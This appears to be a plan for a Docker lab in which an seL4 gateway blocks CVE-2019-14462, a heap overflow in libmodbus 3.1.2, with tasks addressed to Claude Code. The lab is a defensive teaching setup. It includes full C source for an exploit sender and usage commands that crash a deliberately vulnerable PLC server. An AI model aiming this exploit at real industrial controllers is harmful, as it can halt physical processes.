# seL4 ICS Gateway Docker Demonstration Plan

## Executive Summary

This document describes a Docker-based demonstration of an seL4 Cross-Domain Solution (CDS) protecting a vulnerable ICS device from CVE-2019-14462. The demonstration allows professors and researchers to observe how a formally verified gateway blocks memory corruption attacks against industrial control systems.

**Key Components:**
- **Gateway Container:** QEMU running seL4 microkernel with Modbus TCP validation
- **PLC Container:** Vulnerable libmodbus 3.1.2 server (intentionally exploitable)
- **Host Tools:** CVE proof-of-concept and legitimate Modbus client

**Demonstration Goal:** Show that the same attack payload that crashes an unprotected PLC is blocked when routed through the seL4 gateway.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                            HOST MACHINE                                  │
│                                                                         │
│   ┌──────────────┐         ┌──────────────┐                             │
│   │ Open Modscan │         │  CVE PoC     │                             │
│   │ (GUI Client) │         │  (./poc/)    │                             │
│   └──────┬───────┘         └──────┬───────┘                             │
│          │                        │                                     │
│          └───────┬────────────────┘                                     │
│                  │                                                      │
│                  ▼ localhost:502                                        │
│                                                                         │
│ ┌─────────────────────────────────────────────────────────────────────┐ │
│ │ Docker Network: ics-untrusted                                       │ │
│ │ Subnet: 192.168.96.0/24 | Gateway: 192.168.96.254 | internal: true  │ │
│ │                                                                     │ │
│ │   ┌───────────────────────────────────────────────────────────────┐ │ │
│ │   │ Gateway Container (ics-gateway)                               │ │ │
│ │   │ IP: 192.168.96.10 (proxy for seL4)                            │ │ │
│ │   │                                                               │ │ │
│ │   │   eth0 ◄──► br0 ◄──► tap0                                     │ │ │
│ │   │   │              │                                            │ │ │
│ │   │   │    ┌─────────▼─────────┐                                  │ │ │
│ │   │   │    │  QEMU (seL4)      │                                  │ │ │
│ │   │   │    │                   │                                  │ │ │
│ │   │   │    │  net0: 192.168.96.2  ◄── Untrusted (external)       │ │ │
│ │   │   │    │  net1: 192.168.95.1  ◄── Protected (internal)       │ │ │
│ │   │   │    │                   │                                  │ │ │
│ │   │   │    │  Protocol Break:  │                                  │ │ │
│ │   │   │    │  • TCP terminated │                                  │ │ │
│ │   │   │    │  • Length validated                                  │ │ │
│ │   │   │    │  • Packet reconstructed                              │ │ │
│ │   │   │    └─────────┬─────────┘                                  │ │ │
│ │   │   │              │                                            │ │ │
│ │   │   eth1 ◄──► br1 ◄──► tap1                                     │ │ │
│ │   │   IP: 192.168.95.10                                           │ │ │
│ │   │                                                               │ │ │
│ │   └───────────────────────────────────────────────────────────────┘ │ │
│ │                                                                     │ │
│ └─────────────────────────────────┬───────────────────────────────────┘ │
│                                   │                                     │
│ ┌─────────────────────────────────┴───────────────────────────────────┐ │
│ │ Docker Network: ics-protected                                       │ │
│ │ Subnet: 192.168.95.0/24 | Gateway: 192.168.95.254 | internal: true  │ │
│ │                                                                     │ │
│ │   ┌───────────────────────────────────────────────────────────────┐ │ │
│ │   │ PLC Container (ics-plc)                                       │ │ │
│ │   │ IP: 192.168.95.2                                              │ │ │
│ │   │                                                               │ │ │
│ │   │ libmodbus 3.1.2 (VULNERABLE to CVE-2019-14462)               │ │ │
│ │   │ Modbus TCP Server on :502                                     │ │ │
│ │   │                                                               │ │ │
│ │   │ Holding Registers [0-9]:                                      │ │ │
│ │   │   [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000]        │ │ │
│ │   │                                                               │ │ │
│ │   └───────────────────────────────────────────────────────────────┘ │ │
│ │                                                                     │ │
│ └─────────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│   Bypass Access: localhost:5020 ────────────────► PLC:502 (direct)     │
│   ASAN Testing:  localhost:5021 ────────────────► PLC-ASAN:502         │
│                                                                         │
│   Logs:                                                                 │
│   ├── ./logs/gateway.log   (seL4 serial output, blocked attacks)       │
│   └── ./logs/plc.log       (PLC connections, errors)                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Network Configuration

### Docker Networks

| Network | Subnet | Gateway | Purpose |
|---------|--------|---------|---------|
| ics-untrusted | 192.168.96.0/24 | 192.168.96.254 | SCADA/External facing |
| ics-protected | 192.168.95.0/24 | 192.168.95.254 | PLC/Internal segment |

### IP Address Assignments

| Component | Interface | IP Address | Network |
|-----------|-----------|------------|---------|
| Gateway container | eth0 | 192.168.96.10 | ics-untrusted |
| Gateway container | eth1 | 192.168.95.10 | ics-protected |
| seL4 (inside QEMU) | net0 | 192.168.96.2 | Untrusted side |
| seL4 (inside QEMU) | net1 | 192.168.95.1 | Protected side |
| PLC container | eth0 | 192.168.95.2 | ics-protected |

### Port Mappings (Host Access)

| Host Port | Container | Purpose |
|-----------|-----------|---------|
| 502 | gateway:502 | Protected access (via seL4) |
| 5020 | plc:502 | Bypass (direct to vulnerable PLC) |
| 5021 | plc-asan:502 | ASAN build (for CVE proof) |

---

## Container Specifications

### Gateway Container

| Property | Value |
|----------|-------|
| Base Image | Ubuntu 22.04 |
| Key Packages | qemu-system-arm, bridge-utils, iproute2 |
| Privileged | Yes (required for tap/bridge) |
| Capabilities | NET_ADMIN, NET_RAW |
| Devices | /dev/net/tun |
| Networks | ics-untrusted (192.168.96.10), ics-protected (192.168.95.10) |
| Volumes | ./gateway/sel4-image:/sel4-image:ro, ./logs:/logs |

**Internal Setup:**
1. Create br0, add eth0, create tap0, add to br0
2. Create br1, add eth1, create tap1, add to br1
3. Enable proxy ARP for seL4's IPs (192.168.96.2, 192.168.95.1)
4. Launch QEMU with seL4 kernel image

**QEMU Command:**
```bash
qemu-system-arm \
  -machine virt,virtualization=on,highmem=off,secure=off \
  -cpu cortex-a15 \
  -nographic \
  -m size=1024 \
  -global virtio-mmio.force-legacy=false \
  -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
  -device virtio-net-device,netdev=net0,mac=52:54:00:12:34:56 \
  -netdev tap,id=net1,ifname=tap1,script=no,downscript=no \
  -device virtio-net-device,netdev=net1,mac=52:54:00:12:34:57 \
  -kernel /sel4-image/capdl-loader-image-arm-qemu-arm-virt
```

### PLC Container

| Property | Value |
|----------|-------|
| Base Image | Debian 11 |
| Key Packages | libmodbus 3.1.2 (built from source) |
| Networks | ics-protected (192.168.95.2) |
| Ports | 5020:502 (bypass access) |
| Volumes | ./logs:/logs |

**Two Build Targets:**
1. **normal**: Standard build for crash demonstration
2. **asan**: AddressSanitizer build for CVE proof

---

## File Structure

```
sel4-ics-demo/
├── docker-compose.yml              # Container orchestration
├── README.md                       # User documentation
│
├── gateway/
│   ├── Dockerfile                  # Ubuntu + QEMU + bridge-utils
│   ├── setup-network.sh            # Create br0/tap0, br1/tap1, proxy ARP
│   ├── start-gateway.sh            # Launch QEMU with timestamped logging
│   └── sel4-image/
│       └── capdl-loader-image-arm-qemu-arm-virt  # User provides this
│
├── plc/
│   ├── Dockerfile                  # Multi-stage: normal + ASAN
│   ├── modbus_server.c             # 10-register Modbus server
│   └── start-plc.sh                # Launch with logging
│
├── poc/
│   ├── cve_14462_sender.c          # CVE-2019-14462 exploit
│   ├── valid_query.c               # Legitimate Modbus client
│   └── Makefile                    # Build tools on host
│
├── logs/
│   ├── .gitkeep
│   ├── gateway.log                 # seL4 serial output (created at runtime)
│   └── plc.log                     # PLC server log (created at runtime)
│
└── scripts/
    ├── demo-phase1.sh              # Prove CVE exists (ASAN)
    ├── demo-phase2.sh              # Attack unprotected PLC
    └── demo-phase3.sh              # Show gateway protection
```

---

## CVE-2019-14462 Details

### Vulnerability Description

| Field | Value |
|-------|-------|
| CVE ID | CVE-2019-14462 |
| Affected | libmodbus ≤ 3.1.2 |
| Type | Heap buffer overflow |
| CVSS | 7.8 (High) |
| Root Cause | Length field trusted without validation |

### Attack Mechanism

```
Normal Modbus TCP Packet:
┌─────────────┬─────────────┬────────────┬─────────┬──────────────────┐
│ Transaction │ Protocol    │ Length     │ Unit ID │ PDU              │
│ ID (2)      │ ID (2)      │ (2 bytes)  │ (1)     │ (variable)       │
└─────────────┴─────────────┴────────────┴─────────┴──────────────────┘
                             │
                             └── Declares how many bytes follow

CVE-2019-14462 Attack (cve_14462_sender.c):
┌─────────────┬─────────────┬────────────┬─────────┬──────────────────┐
│ 0x00 0x01   │ 0x00 0x00   │ 0x00 0x3C  │ 0x01    │ 600 bytes sent   │
│             │             │ (60 dec)   │         │ (0xDEADBEEF...)  │
└─────────────┴─────────────┴────────────┴─────────┴──────────────────┘
                             │
                             └── LIES: Claims 60 bytes follow
                                 Actually: 601 bytes sent (1 + 600)

Result:
- Server allocates buffer based on length field (60 bytes)
- Server receives 601 bytes of actual data
- Buffer overflow: 541 extra bytes overflow the heap
- Marker pattern 0xDEADBEEF visible in corrupted memory
```

### How seL4 Gateway Blocks It

1. **TCP Termination**: Incoming TCP connection terminates at gateway
2. **Parse MBAP Header**: Extract declared length (60)
3. **Validate Length**: Compare declared vs actual TCP payload
4. **Mismatch Detected**: 60 ≠ 601 → REJECT
5. **Log Attack**: Write to gateway.log with timestamp
6. **Drop Connection**: Never forward to PLC

---

## Demonstration Flow

### Phase 1: Prove CVE Exists (ASAN)

**Purpose:** Technical proof that CVE-2019-14462 is real

```
┌─────────────────────────────────────────────────────────────────────┐
│ $ ./scripts/demo-phase1.sh                                          │
│                                                                     │
│ [*] Starting PLC with AddressSanitizer...                          │
│ [*] Sending malformed packet...                                     │
│                                                                     │
│ ==12345==ERROR: AddressSanitizer: heap-buffer-overflow              │
│ READ of size 601 at 0x7f8b4c000a20                                  │
│   #0 0x55a8b2f in modbus_reply libmodbus/modbus.c:1247             │
│                                                                     │
│ PROVES: The vulnerability exists in libmodbus 3.1.2                │
└─────────────────────────────────────────────────────────────────────┘
```

### Phase 2: Attack Unprotected PLC

**Purpose:** Show real-world impact of the vulnerability

```
┌─────────────────────────────────────────────────────────────────────┐
│ $ ./scripts/demo-phase2.sh                                          │
│                                                                     │
│ [*] Starting vulnerable PLC on port 5020...                        │
│                                                                     │
│ >>> Open Modscan → localhost:5020                                  │
│ >>> Read Holding Registers 0-9                                      │
│ >>> See: 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000 ✓      │
│                                                                     │
│ [*] Sending CVE-2019-14462 exploit...                              │
│                                                                     │
│ >>> Open Modscan again → CONNECTION FAILED                         │
│ >>> PLC has CRASHED                                                 │
│                                                                     │
│ plc.log: [2025-01-01 12:00:00] ERROR: Segmentation fault           │
└─────────────────────────────────────────────────────────────────────┘
```

### Phase 3: Attack Through seL4 Gateway

**Purpose:** Demonstrate protection

```
┌─────────────────────────────────────────────────────────────────────┐
│ $ ./scripts/demo-phase3.sh                                          │
│                                                                     │
│ [*] Starting seL4 Gateway and PLC...                               │
│ [*] Waiting for seL4 to boot (20 seconds)...                       │
│                                                                     │
│ >>> Open Modscan → 192.168.96.2:502 (through gateway)              │
│ >>> Read Holding Registers 0-9                                      │
│ >>> See: 100, 200, 300, 400, 500, 600, 700, 800, 900, 1000 ✓      │
│                                                                     │
│ [*] Sending SAME CVE-2019-14462 exploit...                         │
│                                                                     │
│ gateway.log:                                                        │
│   [2025-01-01 12:05:00] BLOCKED: Length field mismatch             │
│   [2025-01-01 12:05:00]   Declared: 60 bytes                       │
│   [2025-01-01 12:05:00]   Actual: 601 bytes                        │
│   [2025-01-01 12:05:00]   Action: Connection dropped               │
│                                                                     │
│ plc.log: (empty - attack never reached PLC)                        │
│                                                                     │
│ >>> Open Modscan again → STILL WORKS ✓                             │
│ >>> Values unchanged: 100, 200, 300... ✓                           │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Claude Code Implementation Tasks

### Task 1: Project Structure

Create the directory structure with placeholder files.

### Task 2: docker-compose.yml

```yaml
version: '3.8'

networks:
  ics-untrusted:
    driver: bridge
    internal: true
    ipam:
      config:
        - subnet: 192.168.96.0/24
          gateway: 192.168.96.254

  ics-protected:
    driver: bridge
    internal: true
    ipam:
      config:
        - subnet: 192.168.95.0/24
          gateway: 192.168.95.254

services:
  gateway:
    build: ./gateway
    container_name: ics-gateway
    hostname: gateway
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
    devices:
      - /dev/net/tun:/dev/net/tun
    networks:
      ics-untrusted:
        ipv4_address: 192.168.96.10
      ics-protected:
        ipv4_address: 192.168.95.10
    ports:
      - "502:502"
    volumes:
      - ./gateway/sel4-image:/sel4-image:ro
      - ./logs:/logs
    depends_on:
      - plc
    stdin_open: true
    tty: true

  plc:
    build:
      context: ./plc
      target: normal
    container_name: ics-plc
    hostname: plc
    networks:
      ics-protected:
        ipv4_address: 192.168.95.2
    ports:
      - "5020:502"
    volumes:
      - ./logs:/logs
    environment:
      - LOG_FILE=/logs/plc.log

  plc-asan:
    build:
      context: ./plc
      target: asan
    container_name: ics-plc-asan
    hostname: plc-asan
    ports:
      - "5021:502"
    volumes:
      - ./logs:/logs
    environment:
      - LOG_FILE=/logs/plc-asan.log
      - ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
```

### Task 3: Gateway Dockerfile

```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    qemu-system-arm \
    bridge-utils \
    iproute2 \
    net-tools \
    iputils-ping \
    procps \
    && rm -rf /var/lib/apt/lists/*

COPY setup-network.sh /usr/local/bin/
COPY start-gateway.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/*.sh

EXPOSE 502

CMD ["/usr/local/bin/start-gateway.sh"]
```

### Task 4: Gateway setup-network.sh

```bash
#!/bin/bash
set -e

LOG="/logs/gateway.log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG"; }

log "Setting up network bridges and tap interfaces..."

# Create tap interfaces
ip tuntap add dev tap0 mode tap
ip tuntap add dev tap1 mode tap

# Create bridges
ip link add br0 type bridge
ip link add br1 type bridge

# Get eth0 IP and add eth0 to br0
ETH0_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -1)
if [ -n "$ETH0_IP" ]; then
    ip addr del "$ETH0_IP" dev eth0 || true
fi
ip link set eth0 master br0
ip link set tap0 master br0

if [ -n "$ETH0_IP" ]; then
    ip addr add "$ETH0_IP" dev br0
fi

# Get eth1 IP and add eth1 to br1
ETH1_IP=$(ip -4 addr show eth1 | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -1)
if [ -n "$ETH1_IP" ]; then
    ip addr del "$ETH1_IP" dev eth1 || true
fi
ip link set eth1 master br1
ip link set tap1 master br1

if [ -n "$ETH1_IP" ]; then
    ip addr add "$ETH1_IP" dev br1
fi

# Bring up all interfaces
ip link set tap0 up
ip link set tap1 up
ip link set br0 up
ip link set br1 up
ip link set eth0 up
ip link set eth1 up

# Enable proxy ARP for seL4's IPs
echo 1 > /proc/sys/net/ipv4/conf/br0/proxy_arp
echo 1 > /proc/sys/net/ipv4/conf/br1/proxy_arp
echo 1 > /proc/sys/net/ipv4/ip_forward

# Add proxy ARP entries for seL4's IPs
ip neigh add proxy 192.168.96.2 dev br0 || true
ip neigh add proxy 192.168.95.1 dev br1 || true

log "Network setup complete"
log "  br0: eth0 + tap0 (proxy for 192.168.96.2)"
log "  br1: eth1 + tap1 (proxy for 192.168.95.1)"
```

### Task 5: Gateway start-gateway.sh

```bash
#!/bin/bash
set -e

LOG="/logs/gateway.log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG"; }

log "Starting seL4 ICS Gateway..."

# Setup network first
/usr/local/bin/setup-network.sh

# Check for seL4 image
IMAGE="/sel4-image/capdl-loader-image-arm-qemu-arm-virt"
if [ ! -f "$IMAGE" ]; then
    log "ERROR: seL4 image not found at $IMAGE"
    log "Please copy your seL4 image to gateway/sel4-image/"
    exit 1
fi

log "Launching QEMU with seL4..."
log "  net0 (tap0): 192.168.96.2 (untrusted)"
log "  net1 (tap1): 192.168.95.1 (protected)"

# Run QEMU, timestamp all output
qemu-system-arm \
  -machine virt,virtualization=on,highmem=off,secure=off \
  -cpu cortex-a15 \
  -nographic \
  -m size=1024 \
  -global virtio-mmio.force-legacy=false \
  -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
  -device virtio-net-device,netdev=net0,mac=52:54:00:12:34:56 \
  -netdev tap,id=net1,ifname=tap1,script=no,downscript=no \
  -device virtio-net-device,netdev=net1,mac=52:54:00:12:34:57 \
  -kernel "$IMAGE" \
  2>&1 | while IFS= read -r line; do
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $line" | tee -a "$LOG"
done
```

### Task 6: PLC Dockerfile

```dockerfile
FROM debian:11 AS base

RUN apt-get update && apt-get install -y \
    build-essential \
    wget \
    autoconf \
    automake \
    libtool \
    pkg-config \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /src

# Download and build vulnerable libmodbus 3.1.2
RUN wget -q https://github.com/stephane/libmodbus/archive/refs/tags/v3.1.2.tar.gz \
    && tar xzf v3.1.2.tar.gz \
    && cd libmodbus-3.1.2 \
    && ./autogen.sh \
    && ./configure \
    && make \
    && make install \
    && ldconfig

COPY modbus_server.c /src/

# Normal build
FROM base AS normal
RUN gcc -Wall -o modbus_server modbus_server.c \
    $(pkg-config --cflags --libs libmodbus)
COPY start-plc.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/start-plc.sh
EXPOSE 502
CMD ["/usr/local/bin/start-plc.sh"]

# ASAN build
FROM base AS asan
RUN gcc -Wall -fsanitize=address -g -O1 -fno-omit-frame-pointer \
    -o modbus_server modbus_server.c \
    $(pkg-config --cflags --libs libmodbus)
COPY start-plc.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/start-plc.sh
ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:print_legend=0
EXPOSE 502
CMD ["/usr/local/bin/start-plc.sh"]
```

### Task 7: PLC modbus_server.c

Simple Modbus TCP server with 10 holding registers using libmodbus 3.1.2.
- Listens on 0.0.0.0:502
- Registers initialized to [100, 200, 300, ..., 1000]
- Timestamped logging to LOG_FILE environment variable
- Uses vulnerable modbus_reply() function

### Task 8: PLC start-plc.sh

```bash
#!/bin/bash
LOG_FILE="${LOG_FILE:-/logs/plc.log}"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] INFO: Starting PLC server (libmodbus 3.1.2 - VULNERABLE)" | tee -a "$LOG_FILE"
exec /src/modbus_server
```

### Task 9: PoC Tools

**cve_14462_sender.c** (modified from user's original to accept arguments):

```c
#include <errno.h>
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// Default values (can be overridden via command line)
#define DEFAULT_TARGET_IP "192.168.95.2"
#define DEFAULT_TARGET_PORT 502

// Declare a short length (60 bytes) while actually sending 600 bytes to trigger the parser bug.
#define DECLARED_LENGTH 60
#define ACTUAL_PDU_LENGTH 600
#define QUERY_SIZE (7 + ACTUAL_PDU_LENGTH)

static int send_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t rc = send(fd, buf + total, len - total, 0);
        if (rc == -1) {
            return -1;
        }
        total += (size_t)rc;
    }
    return 0;
}

void print_usage(const char *prog) {
    fprintf(stderr, "Usage: %s [IP] [PORT]\n", prog);
    fprintf(stderr, "  IP   - Target IP address (default: %s)\n", DEFAULT_TARGET_IP);
    fprintf(stderr, "  PORT - Target port (default: %d)\n", DEFAULT_TARGET_PORT);
    fprintf(stderr, "\nSends CVE-2019-14462 exploit packet:\n");
    fprintf(stderr, "  Declared length: %d bytes\n", DECLARED_LENGTH);
    fprintf(stderr, "  Actual payload:  %d bytes\n", QUERY_SIZE);
    fprintf(stderr, "  Marker pattern:  0xDEADBEEF\n");
}

int main(int argc, char *argv[]) {
    const char *target_ip = DEFAULT_TARGET_IP;
    int target_port = DEFAULT_TARGET_PORT;

    // Parse arguments
    if (argc >= 2) {
        if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
            print_usage(argv[0]);
            return EXIT_SUCCESS;
        }
        target_ip = argv[1];
    }
    if (argc >= 3) {
        target_port = atoi(argv[2]);
        if (target_port <= 0 || target_port > 65535) {
            fprintf(stderr, "Invalid port: %s\n", argv[2]);
            return EXIT_FAILURE;
        }
    }

    printf("[*] CVE-2019-14462 Exploit\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Declared length: %d bytes\n", DECLARED_LENGTH);
    printf("[*] Actual payload:  %d bytes\n", QUERY_SIZE);
    printf("[*] Overflow size:   %d bytes\n", QUERY_SIZE - 7 - DECLARED_LENGTH + 1);
    printf("\n");

    modbus_t *ctx = modbus_new_tcp(target_ip, target_port);
    if (!ctx) {
        fprintf(stderr, "modbus_new_tcp failed\n");
        return EXIT_FAILURE;
    }

    printf("[*] Connecting to %s:%d...\n", target_ip, target_port);
    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "modbus_connect failed: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("[+] Connected!\n");

    uint8_t query[QUERY_SIZE];
    memset(query, 0, sizeof(query));

    // Build MBAP header followed by the crafted PDU payload.
    query[0] = 0x00; // Transaction ID high
    query[1] = 0x01; // Transaction ID low
    query[2] = 0x00; // Protocol ID high
    query[3] = 0x00; // Protocol ID low
    query[4] = (DECLARED_LENGTH >> 8) & 0xFF; // Length high (declared)
    query[5] = DECLARED_LENGTH & 0xFF;        // Length low (declared)
    query[6] = 0x01; // Unit ID
    query[7] = 0x03; // Function code (Read Holding Registers)
    query[8] = 0x00; // Start address high
    query[9] = 0x00; // Start address low
    query[10] = 0x00; // Quantity high
    query[11] = 0x10; // Quantity low (16 registers)

    /* Fill the payload with a repeating marker pattern (DE AD BE EF) so the
     * overflow is easy to spot when examining memory in gdb. */
    static const uint8_t marker[] = {0xDE, 0xAD, 0xBE, 0xEF};
    for (size_t i = 12; i < sizeof(query); ++i) {
        query[i] = marker[(i - 12) % sizeof(marker)];
    }

    int sock = modbus_get_socket(ctx);
    if (sock == -1) {
        fprintf(stderr, "modbus_get_socket failed\n");
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    printf("[*] Sending malformed packet (%d bytes with length field claiming %d)...\n", 
           QUERY_SIZE, DECLARED_LENGTH);
    
    if (send_all(sock, query, sizeof(query)) == -1) {
        fprintf(stderr, "send failed: %s\n", strerror(errno));
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("[+] Payload sent!\n");

    uint8_t response[260];
    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received == -1) {
        fprintf(stderr, "[!] recv failed: %s\n", strerror(errno));
    } else if (received == 0) {
        fprintf(stderr, "[!] Connection closed by peer without response\n");
        fprintf(stderr, "    (Server may have crashed)\n");
    } else {
        printf("[+] Received %zd bytes:\n", received);
        for (ssize_t i = 0; i < received; ++i) {
            printf("%02x ", response[i]);
            if (i % 16 == 15) {
                printf("\n");
            }
        }
        if (received % 16 != 0) {
            printf("\n");
        }
    }

    modbus_close(ctx);
    modbus_free(ctx);
    return EXIT_SUCCESS;
}
```

**Usage:**
```bash
./cve_14462_sender                     # Uses default 192.168.95.2:502
./cve_14462_sender 192.168.96.2        # Custom IP, default port
./cve_14462_sender 192.168.96.2 502    # Custom IP and port
./cve_14462_sender localhost 5020      # Direct to PLC bypass
./cve_14462_sender localhost 5021      # ASAN PLC for CVE proof
```

**valid_query.c:**
- Usage: `./valid_query <IP> <PORT>`
- Reads holding registers 0-9
- Prints values

**Makefile:**
```makefile
CC = gcc
CFLAGS = -Wall -Wextra
LDFLAGS = $(shell pkg-config --libs libmodbus)
CPPFLAGS = $(shell pkg-config --cflags libmodbus)

all: cve_14462_sender valid_query

cve_14462_sender: cve_14462_sender.c
	$(CC) $(CFLAGS) $(CPPFLAGS) -o $@ $< $(LDFLAGS)

valid_query: valid_query.c
	$(CC) $(CFLAGS) $(CPPFLAGS) -o $@ $< $(LDFLAGS)

clean:
	rm -f cve_14462_sender valid_query

.PHONY: all clean
```

### Task 10: Demo Scripts

Three bash scripts for each demonstration phase with clear output and user prompts.

### Task 11: README.md

Complete documentation with:
- Architecture overview
- Prerequisites
- Quick start guide
- Phase-by-phase demo instructions
- Troubleshooting
- CVE explanation

---

## Prerequisites

### Host Machine Requirements

| Requirement | Purpose |
|-------------|---------|
| Docker | Container runtime |
| Docker Compose | Multi-container orchestration |
| libmodbus-dev | Build PoC tools (`apt install libmodbus-dev`) |
| Open Modscan (optional) | GUI Modbus client for demonstration |

### User-Provided Files

| File | Location | Description |
|------|----------|-------------|
| seL4 kernel image | `gateway/sel4-image/capdl-loader-image-arm-qemu-arm-virt` | Your compiled seL4 CDS |

---

## Quick Start Commands

```bash
# 1. Clone/create project
cd sel4-ics-demo

# 2. Copy seL4 image
cp ~/phd/camkes-vm-examples/build/images/capdl-loader-image-arm-qemu-arm-virt \
   gateway/sel4-image/

# 3. Build containers
docker-compose build

# 4. Build PoC tools (on host)
make -C poc

# 5. Run demonstrations
./scripts/demo-phase1.sh   # Prove CVE
./scripts/demo-phase2.sh   # Attack unprotected
./scripts/demo-phase3.sh   # Show protection
```

---

## seL4 Gateway Requirements

Your seL4 gateway must be configured with:

| Parameter | Value |
|-----------|-------|
| net0 IP | 192.168.96.2 |
| net1 IP | 192.168.95.1 |
| PLC target | 192.168.95.2:502 |
| Modbus port | 502 |

**Current hardcoded IPs in your setup:**
- net0 (tap0): 192.168.96.2 ← External/untrusted
- net1 (tap1): 192.168.95.1 ← Internal/protected

---

## Security Claims for Professors

### What This Demonstrates

1. **Protocol Break**: TCP connections terminate at gateway, packets are not forwarded
2. **Input Validation**: Length field verified against actual payload
3. **Attack Detection**: Malformed packets logged and dropped
4. **Continued Operation**: Gateway remains operational after attack
5. **PLC Protection**: Vulnerable device never receives malicious traffic

### seL4 Advantages

| Property | Linux Firewall | seL4 Gateway |
|----------|----------------|--------------|
| Code size | ~30M LoC | ~10K LoC |
| Formal verification | None | Isabelle/HOL proofs |
| Memory isolation | Best effort | Mathematically proven |
| Attack surface | Large | 3,000x smaller |

---

## Appendix: Attack Packet Structure

```
CVE-2019-14462 Exploit Packet (cve_14462_sender.c):

Total packet size: 607 bytes (7 byte header + 600 byte PDU)
Declared in Length field: 60 bytes
Actual after Length field: 601 bytes
Overflow: 541 bytes beyond declared length

Offset  Bytes         Field           Value       Notes
──────  ────────────  ──────────────  ──────────  ────────────────────────
0x00    00 01         Transaction ID  1           Normal
0x02    00 00         Protocol ID     0           Modbus TCP
0x04    00 3C         Length          60          MALICIOUS: Claims 60 bytes
0x06    01            Unit ID         1           Normal
0x07    03            Function Code   3           Read Holding Registers
0x08    00 00         Start Address   0           Normal
0x0A    00 10         Quantity        16          Normal
0x0C    DE AD BE EF   Overflow data   ---         Repeating marker pattern
...     DE AD BE EF   (continues)     ---         Total 595 more bytes
0x25E   (end)         ---             ---         607 bytes total

Expected by Length field: 60 bytes follow offset 0x04
Actually sent: 601 bytes follow offset 0x04 (Unit ID + 600 byte PDU)

Result: heap-buffer-overflow when server allocates for 60 bytes
        but receives 601 bytes of data
        
Marker pattern 0xDEADBEEF visible in memory dumps for easy identification
```

---

*Document prepared for Claude Code implementation of seL4 ICS Gateway Docker Demonstration*
